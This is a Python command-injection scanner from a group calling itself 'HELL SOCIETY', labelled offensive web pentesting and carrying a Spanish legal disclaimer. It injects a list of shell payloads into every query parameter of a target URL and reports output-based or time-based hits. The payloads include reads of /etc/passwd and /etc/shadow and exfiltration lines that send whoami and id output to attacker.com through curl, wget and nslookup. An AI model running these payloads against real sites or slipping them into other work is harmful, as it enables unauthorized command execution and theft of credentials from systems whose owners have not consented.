#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  COMMAND INJECTION SCANNER v2.0                                  ║
║  Created by: HELL SOCIETY Community                              ║
║  Category: Offensive - Web Pentesting                            ║
╚══════════════════════════════════════════════════════════════════╝

ADVERTENCIA LEGAL: El uso de esta herramienta sin autorización
escrita del propietario del sistema objetivo es ILEGAL.
Los creadores NO se hacen responsables del mal uso de esta herramienta.
"""

import requests
import sys
import colorama
from colorama import Fore, Back, Style
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import argparse
import time

colorama.init(autoreset=True)

BANNER = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════╗
║{Fore.CYAN}   ██████╗██╗   ██╗███████╗████████╗ ██████╗ ███╗   ███╗        {Fore.RED}║
║{Fore.CYAN}  ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔═══██╗████╗ ████║        {Fore.RED}║
║{Fore.CYAN}  ██║      ╚████╔╝ ███████╗   ██║   ██║   ██║██╔████╔██║        {Fore.RED}║
║{Fore.CYAN}  ██║       ╚██╔╝  ╚════██║   ██║   ██║   ██║██║╚██╔╝██║        {Fore.RED}║
║{Fore.CYAN}  ╚██████╗   ██║   ███████║   ██║   ╚██████╔╝██║ ╚═╝ ██║        {Fore.RED}║
║{Fore.CYAN}   ╚═════╝   ╚═╝   ╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝        {Fore.RED}║
╠══════════════════════════════════════════════════════════════════╣
║{Fore.YELLOW}  HELL SOCIETY - Command Injection Scanner v2.0                       {Fore.RED}║
╚══════════════════════════════════════════════════════════════════╝
"""

DISCLAIMER = f"""
{Fore.RED}{Back.BLACK}
[!] ADVERTENCIA LEGAL [!]
Esta herramienta es para uso en pentesting AUTORIZADO únicamente.
Los creadores (HELL SOCIETY) NO se hacen responsables del mal uso.
"""

COMMAND_PAYLOADS = [
    '; id', '| id', '`id`', '$(id)',
    '; whoami', '| whoami', '`whoami`', '$(whoami)',
    '; cat /etc/passwd', '| cat /etc/passwd',
    '; ls -la', '| ls -la',
    '; uname -a', '| uname -a',
    '; pwd', '| pwd',
    '; hostname', '| hostname',
    '; ifconfig', '| ifconfig',
    '; netstat -an', '| netstat -an',
    '|| id', '&& id',
    '|| whoami', '&& whoami',
    '%0a id', '%0d%0a id',
    '\\n id', '\\r\\n id',
    '; sleep 5', '| sleep 5',
    '; ping -c 5 127.0.0.1',
    '|| ping -c 5 127.0.0.1',
    '$(sleep 5)', '`sleep 5`',
    '; nslookup $(whoami).attacker.com',
    '| nslookup $(whoami).attacker.com',
    '; curl http://attacker.com/$(whoami)',
    '| wget http://attacker.com/$(id)',
    '; cat /etc/shadow', '| cat /etc/shadow',
    '; cat /proc/version',
    '; find / -name "*.conf" 2>/dev/null | head -20',
]

class CommandInjectionScanner:
    def __init__(self, target, timeout=10):
        self.target = target
        self.timeout = timeout
        self.vulns = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) HellSociety/2.0'
        })

    def get_params(self):
        parsed = urlparse(self.target)
        return parse_qs(parsed.query)

    def modify_url(self, param, payload):
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                          parsed.params, new_query, parsed.fragment))

    def scan(self):
        params = self.get_params()
        if not params:
            print(f"{Fore.RED}  [!] No parameters found in URL")
            return

        indicators = ['uid=', 'gid=', 'root:', 'daemon:', 'www-data:',
                      'Linux', 'GNU', 'bin:', 'nologin', 'sync:',
                      'groups=', 'total ', 'drwx', '-rw-', 'Hostname',
                      'eth0', 'lo:', 'inet ', 'Connection', 'Active']

        total = len(params) * len(COMMAND_PAYLOADS)
        current = 0

        print(f"{Fore.CYAN}  [*] Testing {len(params)} parameter(s) with {len(COMMAND_PAYLOADS)} payloads")
        print(f"{Fore.CYAN}  [*] Total tests: {total}\n")

        for param in params:
            for payload in COMMAND_PAYLOADS:
                current += 1
                progress = (current / total) * 100
                bar_length = 40
                filled = int(bar_length * current / total)
                bar = f"{Fore.GREEN}█{Style.RESET_ALL}" * filled + f"{Fore.RED}░{Style.RESET_ALL}" * (bar_length - filled)
                print(f"\r{Fore.CYAN}  [{bar}] {progress:.1f}% - Testing: {param}={payload[:30]}", end="", flush=True)

                if 'sleep' in payload or 'ping' in payload:
                    start = time.time()
                    test_url = self.modify_url(param, payload)
                    try:
                        resp = self.session.get(test_url, timeout=15)
                        elapsed = time.time() - start
                        if elapsed > 4:
                            result = {
                                'param': param,
                                'payload': payload,
                                'type': 'Time-Based RCE',
                                'elapsed': elapsed
                            }
                            self.vulns.append(result)
                            print(f"\n")
                            print(f"  {Fore.GREEN}[+] COMMAND INJECTION VULNERABLE!")
                            print(f"  {Fore.GREEN}  Parameter: {Fore.WHITE}{param}")
                            print(f"  {Fore.GREEN}  Payload: {Fore.YELLOW}{payload}")
                            print(f"  {Fore.GREEN}  Type: Time-Based (delayed {elapsed:.1f}s)")
                            print(f"  {Fore.CYAN}  {'─' * 60}")
                    except:
                        pass
                else:
                    test_url = self.modify_url(param, payload)
                    try:
                        resp = self.session.get(test_url, timeout=self.timeout)
                        content = resp.text

                        for indicator in indicators:
                            if indicator in content:
                                result = {
                                    'param': param,
                                    'payload': payload,
                                    'type': 'Output-Based RCE',
                                    'indicator': indicator,
                                    'status': resp.status_code
                                }
                                self.vulns.append(result)
                                print(f"\n")
                                print(f"  {Fore.GREEN}[+] COMMAND INJECTION VULNERABLE!")
                                print(f"  {Fore.GREEN}  Parameter: {Fore.WHITE}{param}")
                                print(f"  {Fore.GREEN}  Payload: {Fore.YELLOW}{payload}")
                                print(f"  {Fore.GREEN}  Indicator: {Fore.WHITE}{indicator}")
                                print(f"  {Fore.GREEN}  Status: {resp.status_code}")
                                print(f"  {Fore.CYAN}  {'─' * 60}")
                                break

                    except requests.exceptions.Timeout:
                        pass
                    except requests.exceptions.RequestException:
                        pass

    def print_results(self):
        if not self.vulns:
            print(f"\n\n{Fore.YELLOW}  [!] No command injection vulnerabilities found")
            return

        print(f"\n\n{Fore.RED}{Back.BLACK}  SCAN COMPLETE - {len(self.vulns)} VULNERABILITY(IES) FOUND  ")
        print(f"{Fore.CYAN}  {'═' * 60}")

        for i, v in enumerate(self.vulns, 1):
            print(f"\n  {Fore.CYAN}[{i}] {Fore.WHITE}Param: {v['param']}")
            print(f"      {Fore.YELLOW}Payload: {v['payload']}")
            print(f"      {Fore.GREEN}Type: {v['type']}")
            if 'indicator' in v:
                print(f"      {Fore.GREEN}Indicator: {v['indicator']}")

def main():
    print(BANNER)
    print(DISCLAIMER)

    parser = argparse.ArgumentParser(description='Hell Society Command Injection Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL with parameters')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout')
    args = parser.parse_args()

    scanner = CommandInjectionScanner(args.url, args.timeout)
    print(f"{Fore.CYAN}  [*] Target: {Fore.WHITE}{args.url}")
    print(f"{Fore.CYAN}  [*] Starting Command Injection scan...\n")

    scanner.scan()
    scanner.print_results()

if __name__ == "__main__":
    main()
